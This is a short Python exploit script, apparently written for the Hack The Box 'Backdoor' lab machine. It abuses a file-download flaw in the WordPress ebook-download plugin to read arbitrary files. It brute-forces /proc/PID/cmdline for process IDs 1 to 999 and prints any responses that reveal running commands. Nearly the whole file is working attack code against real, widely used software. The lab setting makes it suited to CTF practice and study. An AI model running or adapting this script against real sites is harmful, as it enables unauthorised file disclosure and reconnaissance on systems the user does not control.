#!/usr/bin/python3
# This exploit is for HTB backdoor
# Created by S4vitar aka savitar. Stolen by pablo >>> me

from pwn import *
import requests, signal, time, sys, pdb

def def_handler(sig, frame):
    print("\n\n[!] Exiting", __file__)
    #print(__file__)
    sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, def_handler)

main_url = "http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl="

def makeRequest():
    #/proc/PID/cmdline
    p1 = log.progress("Brute Force Attack")
    p1.status("Starting brute force attack")

    time.sleep(1)

    for i in range(1, 1000):
        p1.status("Trying with PATH /proc/%s/cmdline" % str(i))
        url = main_url + "/proc/" + str(i) + "/cmdline"
        r = requests.get(url)
        #print(len(r.content))
        #print(url)
        #pdb.set_trace() # debugging
        if len(r.content) > 82:
            print("------------------------------------------------------------------------")
            log.info("PATH: /proc/%s/cmdline" % str(i))
            log.info("Total length: %s" % len(r.content))
            print(r.content)
            print("------------------------------------------------------------------------")



if __name__ == '__main__':
    makeRequest()
